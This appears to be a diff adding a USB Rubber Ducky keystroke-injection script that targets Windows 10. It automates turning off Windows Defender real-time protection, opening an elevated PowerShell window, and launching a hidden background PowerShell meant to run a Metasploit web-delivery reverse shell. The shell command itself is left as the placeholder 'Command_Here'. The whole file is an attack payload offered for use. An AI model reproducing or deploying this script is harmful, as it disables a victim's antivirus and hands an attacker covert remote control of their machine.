@@ -1,0 +1,61 @@
+REM Title: Windows10_Metasploit_ReverseShell
+REM Description: Disables Windows Defender And Connects A Metasploit Reverse Shell To The Attacker Machine Using PowerShell. (Requires Admin Privilege.)
+REM Extra: This Uses A Metasploit Reverse_TCP Shell To Initiate a Reverse Shell. (The module used for this Specific reverse shell is the 'Web Delivery' Module.)
+REM Author: Crow0278
+REM Target: Windows 10 (Maybe 11)
+DELAY 500
+REM Opens Windows Defender.
+CTRL ESC
+DELAY 1000
+STRING Windows Security
+DELAY 500
+ENTER
+DELAY 2000
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+TAB
+TAB
+REM Turns of Windows Defender.
+DELAY 500
+ENTER
+DELAY 500
+REM Closes Windows Defender.
+ALT F4
+DELAY 500
+GUI r
+REM Opens PowerShell
+DELAY 500
+STRING PowerShell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 700
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+REM Runs The Metasploit Command In The PowerShell Window And Runs It In The Background.
+STRING Start-Process powershell -ArgumentList "-NoExit -Command 'Command_Here'" -WindowStyle Hidden
+DELAY 500
+ENTER
+DELAY 500
+REM Closes The Running PowerShell Terminal.
+STRING exit
+DELAY 500 
+ENTER
+
+
+
+
+
+
+ 
